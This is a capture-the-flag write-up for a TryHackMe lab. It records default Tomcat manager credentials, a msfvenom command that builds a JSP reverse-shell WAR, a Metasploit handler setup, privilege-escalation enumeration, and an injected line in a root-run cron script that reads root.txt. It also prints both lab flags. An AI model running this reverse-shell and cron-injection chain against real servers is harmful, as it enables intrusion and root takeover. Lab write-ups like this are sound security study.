![[Pasted image 20230923155041.png]]


https://tryhackme.com/room/bsidesgtthompson

Task: read user.txt and root.txt

I've started with port scanning by nmap to check what services are running on these ports:

$ nmap -sV -sC -v 10.10.200.96
![[Pasted image 20230917155601.png]]

I've opened a webserver on port 8080:

http://10.10.200.96:8080/
![[Pasted image 20230917125132.png]]

and tried to log in Manager App, but I didn't have username and password, so I cancelled it and found credentials on the error page:
![[Pasted image 20230917125154.png]]



![[Pasted image 20230917104551.png]]

![[Pasted image 20230917104704.png]]


I took username="tomcat" password="s3cret" :
![[Pasted image 20230917104922.png]]

I created a WAR reverseshell payload by using msfvenom:

$ msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.200.96 lport=4444 -f war -o /home/kali/Desktop/shell1.war

![[Pasted image 20230917155813.png]]

After uploading the shell1.war file, I found a new  shell1, in the applications table:


![[Pasted image 20230917110313.png]]

![[Pasted image 20230917110754.png]]
I've run msfconsole
$ msfconsole  
msf6 > use /multi/handler

I've set up lhost:
msf6 exploit(multi/handler) > set LHOST 10.9.86.167

![[Pasted image 20230917115203.png]]

and payload:
msf6 exploit(multi/handler) > set payload java/jsp_shell_reverse_tcp
![[Pasted image 20230917130254.png]]


and shell:
msf6 exploit(multi/handler) > set SHELL /bin/bash
![[Pasted image 20230917113942.png]]



msf6 > exploit/multi/handler > show options

![[Pasted image 20230917130403.png]]



I sat LHOST to tun0 and started it:
set LHOST tun0

![[Pasted image 20230917160018.png]]


Whoami query showed I was a tomcat, so I searched for and listed files with the setuid bit set on the system, and then displayed their detailed information:

find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;

![[Pasted image 20230917160957.png]]

I've used getcap / -r 2>/dev/null to find the file system for set capabilities attributes on files and display them (It's used in the context of system security to allow programs to access specific functionality or privileges without needing full root privileges:

getcap / -r 2>/dev/null

![[Pasted image 20230917161118.png]]


By using cat /etc/crontab I've searched for user definitions responsible for executing tasks and the paths to scripts or commands:
cat /etc/crontab

![[Pasted image 20230917161220.png]]

![[Pasted image 20230917161303.png]]

We go to jack directory to access its contents:

cd /home/jack
![[Pasted image 20230917161427.png]]

Than, I searched for uset.txt and root.txt flags:

echo "cat /root/root.txt > test.txt" >> id.sh
cat id.sh
![[Pasted image 20230917161719.png]]
cat test.txt
![[Pasted image 20230917161808.png]]
flag d89d5391984c0450a95497153ae7ca3a -   root.txt


USER.TXT
cat /home/jack/user.txt
39400c90bc683a41a8935e4719f181bf
![[Pasted image 20230917162324.png]]
